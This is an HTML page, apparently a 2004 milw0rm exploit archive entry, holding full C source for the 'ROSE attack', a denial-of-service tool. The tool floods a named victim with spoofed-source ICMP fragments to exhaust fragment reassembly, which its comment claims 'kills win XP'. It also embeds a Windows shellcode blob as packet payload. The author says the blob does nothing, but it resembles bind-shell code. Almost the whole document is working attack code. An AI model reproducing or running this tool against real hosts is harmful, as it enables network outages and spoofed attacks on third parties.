<html>
<head>
<title>ROSE Attack - Newdawn2</title>
</head>
<pre>
/***
    ROSE attack (chuck (at) lemure.net)

    Discovered by:
    gandalf@digital.net
    
    code modified from large IGMP attack by:
    Kox by Coolio (coolio@k-r4d.com)


    Sends out first and last ICMP packet echo request.
    Reportedly works for TCP / UDP as well, since this is
    a IP layer attack.

    Eats up all available packets for fragmentation reassembly.


***/

/* just a thousand kills win XP */

#define NUM_PACKETS 1000


#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;pwd.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/ip_icmp.h&gt;

#include &lt;netinet/ip_icmp.h&gt;

/* Figured I try sending some shell code for my random payload...
   doesn't do anything
*/

char code[] =
&quot;\xe8\x38\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xe5\x49\x86&quot;
&quot;\x49\xa4\xad\x2e\xe9\xa4\x1a\x70\xc7\xd9\x09\xf5\xad\xcb\xed\xfc&quot;
&quot;\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2\x73\xad\xd9\x05\xce\x72\xfe\xb3&quot;
&quot;\x16\x57\x53\x32\x5f\x33\x32\x2e\x44\x4c\x4c\x00\x01\x5b\x54\x89&quot;
&quot;\xe5\x89\x5d\x00\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c&quot;
&quot;\xad\x8b\x58\x08\xeb\x0c\x8d\x57\x2c\x51\x52\xff\xd0\x89\xc3\x59&quot;
&quot;\xeb\x10\x6a\x08\x5e\x01\xee\x6a\x0a\x59\x8b\x7d\x00\x80\xf9\x06&quot;
&quot;\x74\xe4\x51\x53\xff\x34\x8f\xe8\x90\x00\x00\x00\x59\x89\x04\x8e&quot;
&quot;\xe2\xeb\x31\xff\x66\x81\xec\x90\x01\x54\x68\x01\x01\x00\x00\xff&quot;
&quot;\x55\x20\x57\x57\x57\x57\x47\x57\x47\x57\xff\x55\x1c\x89\xc3\x31&quot;
&quot;\xff\x57\x57\x68\x02\x00\x22\x11\x89\xe6\x6a\x10\x56\x53\xff\x55&quot;
&quot;\x18\x57\x53\xff\x55\x14\x57\x56\x53\xff\x55\x10\x89\xc2\x66\x81&quot;
&quot;\xec\x54\x00\x8d\x3c\x24\x31\xc0\x6a\x15\x59\xf3\xab\x89\xd7\xc6&quot;
&quot;\x44\x24\x10\x44\xfe\x44\x24\x3d\x89\x7c\x24\x48\x89\x7c\x24\x4c&quot;
&quot;\x89\x7c\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49&quot;
&quot;\x51\x51\xff\x75\x00\x51\xff\x55\x30\x89\xe1\x68\xff\xff\xff\xff&quot;
&quot;\xff\x31\xff\x55\x2c\x57\xff\x55\x0c\xff\x55\x28\x53\x55\x56\x57&quot;
&quot;\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18&quot;
&quot;\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc&quot;
&quot;\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c&quot;
&quot;\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c&quot;
&quot;\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d&quot;
&quot;\x5b\xc2\x08\x00&quot;;

void usage(char *arg)
{
        printf(&quot;Rose attack\n&quot;);
        printf(&quot;Usage: %s &lt;victim&gt; [source]\n&quot;, arg);
	printf(&quot;If source not specified, will send out from random ip's\n&quot;);
        exit(1);
}


unsigned int randip()
{
        struct hostent *he;
        struct sockaddr_in sin;
        char *buf = (char *)calloc(1, sizeof(char) * 16);
	
        sprintf(buf, &quot;%d.%d.%d.%d&quot;,
                (random()%191)+23,
                (random()%253)+1,
                (random()%253)+1,
                (random()%253)+1); 
	
	
	
        return inet_addr(buf);
        
}

unsigned short in_cksum(unsigned short *buh, int len)
{
        register long sum = 0;
        unsigned short oddbyte;
        register unsigned short answer;

        while(len &gt; 1) {
                sum += *buh++;
                len -= 2;
        }

        if(len == 1) {
                oddbyte = 0;
                *((unsigned char *)&amp;oddbyte) = *(unsigned char *)buh;
                sum += oddbyte;
        }

        sum = (sum &gt;&gt; 16) + (sum &amp; 0xFFFF);
        sum += (sum &gt;&gt; 16);
        answer = ~sum;
        return answer;
}

int rose(struct sockaddr_in *victim, unsigned long src)
{
        int SMALLICMP = 1000;
        unsigned char *pkt;
        struct iphdr *ip;
        struct igmphdr *igmp;
	struct icmphdr *icmp_pkt;
        struct utsname *un;
        struct passwd *p;

        int i, s,j;
        int id = (random() % 40000) + 500;

        pkt = (unsigned char *)calloc(1, SMALLICMP);
        ip = (struct iphdr *)pkt;
 	icmp_pkt = (struct icmphdr *)(pkt + sizeof(struct iphdr));
        ip-&gt;version = 4;
        ip-&gt;ihl = (sizeof *ip) / 4;
        ip-&gt;ttl = 255;
        ip-&gt;tot_len = htons(SMALLICMP);
        ip-&gt;protocol = 1;
        ip-&gt;id = htons(id);
        ip-&gt;frag_off = htons(IP_MF);
        ip-&gt;saddr = src;
        ip-&gt;daddr = victim-&gt;sin_addr.s_addr;
        ip-&gt;check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

	icmp_pkt-&gt;type = ICMP_ECHO;
	icmp_pkt-&gt;code = 0;
	icmp_pkt-&gt;checksum = 1000;
	icmp_pkt-&gt;un.echo.id = random() % 255;
	icmp_pkt-&gt;un.echo.sequence = random() % 255;
	
        for(i = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1;
            i &lt; SMALLICMP; i++){
	  //pkt[i] = random() % 255;
	  pkt[i] = '\x00';
	}
	j=0;
	for (i=sizeof(struct iphdr) + sizeof(struct icmphdr) + 500;
	     i &lt; sizeof(struct iphdr) + sizeof(struct icmphdr) + 500 + 356; 
	     i++){
	  pkt[i] = code[j];
	  j++;
	}
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) {
                perror(&quot;error: socket()&quot;);
                return 1;
        }

        if(sendto(s, pkt, SMALLICMP, 0, (struct sockaddr *)victim,
           sizeof(struct sockaddr_in)) == -1) { 
                perror(&quot;error: sendto()&quot;);
                return 1;
        }

	/* big frag at end... */

	ip-&gt;frag_off = htons(8100);
	//ip-&gt;frag_off = htons(8100 | IP_MF);
	sendto(s, pkt, SMALLICMP, 0, (struct sockaddr *)victim, 
	       sizeof(struct sockaddr_in));
	
        free(pkt);
        close(s);
	usleep(1000);
        return 0;
}

int main(int argc, char *argv[])
{
        struct sockaddr_in victim;
        struct hostent *he;
	unsigned long source;
        int i;

        srandom(time(NULL));

        if(argc &lt; 2)
                usage(argv[0]);

        if((he = gethostbyname(argv[1])) == NULL) {
                herror(argv[1]);
                exit(1);
        }
	
	if (argc &gt; 2){
	  source = inet_addr(argv[2]);
	}
	else {
	  source = randip();
	}
	
        memcpy(&amp;victim.sin_addr.s_addr, he-&gt;h_addr, he-&gt;h_length);
        victim.sin_port = htons(0);
        victim.sin_family = PF_INET;

        printf(&quot;Sending ICMP fragments:  &quot;);
        fflush(stdout);
        for(i = 0; i &lt; NUM_PACKETS; i++)
	  {
                rose(&amp;victim, source);
		if (argc &lt; 3){
		  source = randip();
		}
                printf(&quot;%d\n&quot;, i);
                fflush(stdout);
	  }
        printf(&quot;\nDONE\n&quot;);
        fflush(stdout);
}

// milw0rm.com [2004-09-27]
</pre>
</html>

